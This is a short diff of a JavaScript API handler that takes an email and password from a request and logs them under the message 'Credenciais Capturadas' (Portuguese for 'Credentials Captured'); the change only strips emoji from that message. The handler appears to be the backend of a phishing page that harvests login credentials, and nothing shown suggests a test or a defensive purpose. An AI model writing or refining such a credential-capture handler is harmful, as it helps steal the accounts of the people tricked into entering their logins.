@@ -10,7 +10,7 @@ export default function handler(req, res) {
 
   const { email, password } = req.body
 
-  const message = `🥃 Credenciais Capturadas 🥃`
+  const message = `Credenciais Capturadas`
 
   console.log(message)
   console.log(`Email: ${email}`)
